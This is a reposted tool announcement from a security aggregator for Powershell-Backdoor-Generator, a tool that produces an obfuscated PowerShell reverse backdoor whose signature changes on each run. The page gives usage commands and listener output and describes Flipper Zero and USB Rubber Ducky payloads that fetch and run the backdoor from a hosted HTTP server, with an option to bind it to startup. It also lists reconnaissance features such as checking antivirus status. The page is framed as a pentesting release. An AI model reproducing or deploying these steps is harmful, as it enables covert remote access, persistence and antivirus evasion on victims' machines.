---
title: Powershell-Backdoor-Generator - Obfuscated Powershell Reverse Backdoor With Flipper Zero And USB Rubber Ducky Payloads
url: https://buaq.net/go-148967.html
source: unSafe.sh - 不安全
date: 2023-02-12
fetch_date: 2025-10-04T06:25:20.993733
---

# Powershell-Backdoor-Generator - Obfuscated Powershell Reverse Backdoor With Flipper Zero And USB Rubber Ducky Payloads

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/52dc0adac85665f24848a24feab161b4.jpg)

Powershell-Backdoor-Generator - Obfuscated Powershell Reverse Backdoor With Flipper Zero And USB Rubber Ducky Payloads

Reverse backdoor written in Powershell and obfuscated with Python. Allowing the backdoor to
*2023-2-11 19:30:0
Author: [www.kitploit.com(查看原文)](/jump-148967.htm)
阅读量:41
收藏*

---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8yNnsQjM2xippPg67EgJlkIol016dt_X5BJB5POSGkjCStS6APWcucKheQ9mm8mik7iWC19q6E6xW8J00DlhTkxTIPLjYci4nDXxFjIIbnv5_gaPjwHT3DotLSPK17SfkdV4BJIIoIZNkkZFYk-YaRvgZWJ_AlHsbv2HrBVs0Auld5_axS9cXnRQgbA/w640-h336/powershell-backdoor-generator_1_preview.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8yNnsQjM2xippPg67EgJlkIol016dt_X5BJB5POSGkjCStS6APWcucKheQ9mm8mik7iWC19q6E6xW8J00DlhTkxTIPLjYci4nDXxFjIIbnv5_gaPjwHT3DotLSPK17SfkdV4BJIIoIZNkkZFYk-YaRvgZWJ_AlHsbv2HrBVs0Auld5_axS9cXnRQgbA/s914/powershell-backdoor-generator_1_preview.png)

Reverse backdoor written in Powershell and obfuscated with Python. Allowing the backdoor to have a new signature after every run. Also can generate auto run scripts for Flipper Zero and USB Rubber Ducky.

```
usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY] [--flipper FLIPPER] [--ducky]
```

* Hak5 Rubber Ducky payload
* Flipper Zero payload
* Download Files from remote system
* Fetch target [computers](https://www.kitploit.com/search/label/Computers "computers") public IP address
* List local users
* Find Intresting Files
* Get OS Information
* Get BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Checks for common [pentesting](https://www.kitploit.com/search/label/Pentesting "pentesting") software installed

## Standard backdoor

```
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```

A file in the current working directory will be created called backdoor.ps1

When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.

## Payloads

* Execute -- Execute the backdoor
* BindAndExecute -- Place the backdoor in temp, bind the backdoor to startup and then execute it.

## Flipper Zero Backdoor

```
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt --payload execute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```

Place the text file you specified (e.g: powershell\_backdoor.txt) into your flipper zero. When the payload is executed it will download and execute backdoor.ps1

## Usb Rubber Ducky Backdoor

```
 C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```

A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed it will download and execute backdoor.ps1

## Backdoor Execution

Tested on Windows 11, [Windows 10](https://www.kitploit.com/search/label/Windows%2010 "Windows 10") and Kali Linux

```
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```

```
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```

## To Do

* Add Standard Backdoor
* Find Writeable Directories
* Get Windows Update Status

## Output of 5 obfuscations/Runs

```
sha1:c7a5fa3e56640ce48dcc3e8d972e444d9cdd2306
sha1:b32dab7b26cdf6b9548baea6f3cfe5b8f326ceda
sha1:e49ab36a7ad6b9fc195b4130164a508432f347db
sha1:ba40fa061a93cf2ac5b6f2480f6aab4979bd211b
sha1:f2e43320403fb11573178915b7e1f258e7c1b3f0
```

Powershell-Backdoor-Generator - Obfuscated Powershell Reverse Backdoor With Flipper Zero And USB Rubber Ducky Payloads
![Powershell-Backdoor-Generator - Obfuscated Powershell Reverse Backdoor With Flipper Zero And USB Rubber Ducky Payloads](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8yNnsQjM2xippPg67EgJlkIol016dt_X5BJB5POSGkjCStS6APWcucKheQ9mm8mik7iWC19q6E6xW8J00DlhTkxTIPLjYci4nDXxFjIIbnv5_gaPjwHT3DotLSPK17SfkdV4BJIIoIZNkkZFYk-YaRvgZWJ_AlHsbv2HrBVs0Auld5_axS9cXnRQgbA/s72-w640-c-h336/powershell-backdoor-generator_1_preview.png)
Reviewed by Zion3R
on
8:30 AM
Rating: 5

文章来源: http://www.kitploit.com/2023/02/powershell-backdoor-generator.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)